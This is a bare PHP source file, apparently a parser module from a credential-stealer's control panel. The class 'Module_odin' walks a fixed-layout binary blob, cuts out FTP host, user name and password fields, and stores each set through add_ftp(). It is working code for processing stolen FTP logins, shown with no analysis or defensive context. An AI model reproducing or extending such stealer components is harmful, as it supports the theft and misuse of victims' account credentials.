<?php
//ok
	class Module_odin extends Module_
	{
		function GetItem($Source)
		{
			for ($i = 0; $i < strlen($Source); $i++)
			{
				if ($Source[$i] == chr(0))
				{
					$Source = substr($Source, 0, $i);
					break;
				}
			}
				
			return $Source;
		}
	
		function ProcessOdin($Data)
		{
			while (strlen($Data) > 688)
			{
				//GetItem(substr($Data, 0, 260));
				$Data = substr($Data, 260);
				$Host = $this->GetItem(substr($Data, 0, 56));
				
				$Data = substr($Data, 56);
				$User = $this->GetItem(substr($Data, 0, 50));
				
				$Data = substr($Data, 50);
				$Pass = $this->GetItem(substr($Data, 0, 50));
				
				$Data = substr($Data, 50);
				//GetItem(substr($Data, 0, 260));
				
				$Data = substr($Data, 260);
				//GetItem(substr($Data, 0, 272));
				
				$Data = substr($Data, 272);

				$this->add_ftp($Host, $User, $Pass);
			}
				
		}
			
		public function process_module($Data, $Version)
		{
			switch ($Version)
			{
				case 0:
					$this->ProcessOdin($Data);
					break;
				default:
					return FALSE;
			}
			
			return TRUE;
		}
	}